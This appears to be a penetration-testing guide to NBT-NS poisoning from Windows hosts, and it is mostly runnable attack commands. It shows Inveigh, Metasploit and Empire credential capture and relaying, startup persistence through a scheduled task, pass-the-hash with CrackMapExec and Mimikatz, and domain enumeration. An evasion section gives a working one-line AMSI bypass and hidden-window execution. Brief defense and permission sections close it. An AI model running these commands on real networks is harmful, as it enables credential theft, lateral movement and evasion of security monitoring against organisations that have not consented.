# NBT-NS Poisoning from Windows

## NBT-NS Poisoning from Windows

NBT-NS (NetBIOS Name Service) poisoning can also be performed from Windows systems. This approach offers certain advantages, particularly in environments where running Linux tools might trigger security alerts. This guide covers the techniques, tools, and considerations for performing NBT-NS poisoning attacks from Windows platforms.

### Understanding NBT-NS in Windows Environments

NetBIOS Name Service resolution is native to Windows systems, which provides both advantages and challenges when conducting poisoning attacks from Windows:

1. **Native Integration**: Windows tools can interact with NBT-NS more naturally
2. **Bypassing Defenses**: Security tools may not flag Windows utilities as suspicious
3. **Persistent Access**: Can be configured as a service for long-term poisoning

### Required Tools

To perform NBT-NS poisoning from Windows, you'll need one or more of the following tools:

* **Inveigh**: PowerShell-based tool for LLMNR/NBT-NS/mDNS poisoning
* **Responder for Windows**: Windows port of the popular Linux tool
* **PowerShell Empire**: Has modules for LLMNR/NBT-NS poisoning
* **Metasploit**: Contains auxiliary modules for poisoning attacks

### Using Inveigh

Inveigh is the most powerful native Windows tool for NBT-NS poisoning.

#### Installation

```powershell
# Install from PowerShell Gallery (if Internet access is available)
Install-Module -Name Inveigh

# Alternatively, download and import manually
Import-Module .\Inveigh.ps1
```

#### Basic Usage

```powershell
# Start Inveigh with default settings
Invoke-Inveigh

# For more targeted NBT-NS poisoning
Invoke-Inveigh -NBNSPriority Y -NBNS Y -NBNSTypes 00,03,20,1B -HTTP N -HTTPS N -SMB Y
```

#### Parameter Explanation

* **NBNSPriority**: Sets priority for NBT-NS over other protocols
* **NBNS**: Enables/disables NBT-NS spoofing
* **NBNSTypes**: Specifies NetBIOS suffixes to respond to
* **HTTP/HTTPS**: Enables/disables HTTP/HTTPS listeners
* **SMB**: Enables/disables SMB listener

#### Viewing Captured Credentials

```powershell
# Display captured credentials
Get-Inveigh

# Export Inveigh output to a file
Get-Inveigh -Log | Out-File -FilePath C:\path\to\inveigh_output.txt
```

### Inveigh Relay Setup

Inveigh-Relay extends Inveigh's functionality to perform relay attacks:

```powershell
# Import Inveigh-Relay
Import-Module .\Inveigh-Relay.ps1

# Start Inveigh for capturing
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -SMB N

# In another PowerShell window, start relay
Invoke-InveighRelay -ConsoleOutput Y -Target 192.168.1.10 -Command "whoami"
```

### Inveigh.exe (C# Version)

The compiled C# version of Inveigh offers better performance and fewer detection issues:

```cmd
# Run Inveigh.exe with NBT-NS poisoning
Inveigh.exe -nbns y -nbnstype 00,03,20,1B

# Specify output file
Inveigh.exe -nbns y -fileoutput c:\temp\inveigh.txt
```

### PowerShell Empire Approach

If you're using PowerShell Empire, you can leverage its built-in modules:

```
# From an Empire agent
usemodule collection/inveigh

# Set options
set NBNS true
set ConsoleOutput true

# Execute
execute
```

### Metasploit Framework Approach

Metasploit includes modules for LLMNR/NBT-NS poisoning:

```
# In Metasploit console
use auxiliary/spoof/llmnr/llmnr_response
set INTERFACE <your_interface>
run

# For NBT-NS specifically
use auxiliary/spoof/nbns/nbns_response
set INTERFACE <your_interface>
run
```

### Advanced NBT-NS Poisoning Techniques in Windows

#### Persistent NBT-NS Poisoning

To maintain poisoning across reboots or user sessions:

```powershell
# Create scheduled task to run Inveigh at startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Path\To\Inveigh-Persistent.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "NBT-NS Poisoning" -Description "Persistent NBT-NS poisoning" -RunLevel Highest
```

**Example Inveigh-Persistent.ps1:**

```powershell
Import-Module C:\Path\To\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput N -FileOutput Y -NBNS Y -NBNSTypes 00,03,20,1B -OutputDir C:\Path\To\Output
```

#### Targeted Poisoning

For more precise targeting:

```powershell
# Target specific hostnames
Invoke-Inveigh -NBNS Y -NBNSTypes 00,20 -SpooferHostsReply "fileserver,printserver" -SpooferIP 192.168.1.100
```

#### Relay Attacks with Inveigh and CrackMapExec

Using Inveigh to capture and CrackMapExec to reuse credentials:

1. Capture hashes with Inveigh

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y
```

2. Extract the NTLMv2 hash from the output
3. Use the hash with CrackMapExec from another system

```bash
crackmapexec smb 192.168.1.0/24 -u username -H HASH_FROM_INVEIGH
```

### Defending Against Windows-Based Poisoning

Windows-based NBT-NS poisoning may be more difficult to detect than Linux-based attacks. Consider these defense techniques:

1. **Network segmentation**: Limit broadcast traffic between network segments
2. **Windows Defender Advanced Threat Protection**: Can detect Inveigh and similar tools
3. **PowerShell Script Block Logging**: Detects PowerShell-based poisoning tools
4. **AppLocker/WDAC policies**: Prevent unauthorized PowerShell scripts from running
5. **Network monitoring**: Look for unusual NBT-NS response patterns

### Combining with Other Windows Attack Techniques

NBT-NS poisoning pairs well with other Windows attack techniques:

#### With Mimikatz

```powershell
# After capturing hashes with Inveigh, use Mimikatz to perform pass-the-hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.local /ntlm:hash /run:powershell.exe"'
```

#### With PowerView

```powershell
# Use PowerView to find additional targets after initial compromise
Import-Module .\PowerView.ps1
Find-LocalAdminAccess
```

#### With BloodHound

```powershell
# Collect data for BloodHound to identify attack paths using the captured credentials
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Evading Detection on Windows

When performing NBT-NS poisoning from Windows, consider these evasion techniques:

#### PowerShell Script Obfuscation

```powershell
# Use obfuscated versions of Inveigh
Import-Module .\Inveigh-Obfuscated.ps1
```

#### AMSI Bypass

```powershell
# Attempt to bypass AMSI before loading Inveigh
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Process Isolation

```powershell
# Run in a separate PowerShell process
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File .\RunInveigh.ps1" -WindowStyle Hidden
```

### Practical Scenarios for Windows-Based Poisoning

#### Internal Penetration Testing

During internal penetration testing, Windows-based NBT-NS poisoning offers several advantages:

1. **Blend in**: Looks like normal Windows traffic
2. **Endpoint testing**: Test endpoint security controls directly
3. **Policy testing**: Evaluate PowerShell restrictions and application whitelisting

#### Post-Exploitation

After gaining access to a Windows system:

```powershell
# Check for AV/EDR
Get-Service | Where-Object { $_.DisplayName -like "*Defender*" -or $_.DisplayName -like "*Symantec*" -or $_.DisplayName -like "*McAfee*" }

# Check PowerShell execution policy
Get-ExecutionPolicy

# Run Inveigh with appropriate settings based on environment
Invoke-Inveigh -NBNS Y -NBNSTypes 00,20 -ConsoleOutput Y
```

#### Network Lateral Movement

Use NBT-NS poisoning to expand access through the network:

1. Compromise initial Windows system
2. Run Inveigh to capture credentials from other segments
3. Use captured credentials to move laterally
4. Repeat process in new network segments

### Comparing Windows vs. Linux Poisoning Approaches

| Aspect               | Windows-Based                              | Linux-Based                                    |
| -------------------- | ------------------------------------------ | ---------------------------------------------- |
| Stealth              | Higher (looks like normal Windows traffic) | Lower (unusual for Linux to respond to NBT-NS) |
| Ease of setup        | More complex (PowerShell restrictions)     | Simpler (tools designed for this purpose)      |
| Performance          | Variable (depends on host resources)       | Generally higher                               |
| Persistence options  | More native options                        | Requires custom solutions                      |
| Detection likelihood | Lower (if properly executed)               | Higher (abnormal network behavior)             |

### Legal and Ethical Considerations

* Only perform NBT-NS poisoning on networks where you have explicit permission
* Document all activities thoroughly
* Store captured credentials securely
* Remove all poisoning tools when testing is complete
* Reset any modified system configurations

### Conclusion

Windows-based NBT-NS poisoning provides a powerful and potentially stealthier alternative to traditional Linux-based approaches. By leveraging native Windows tools like Inveigh, attackers or penetration testers can capture credentials while blending in with normal network traffic. Understanding these techniques is essential both for offensive security professionals and defenders building comprehensive security controls.
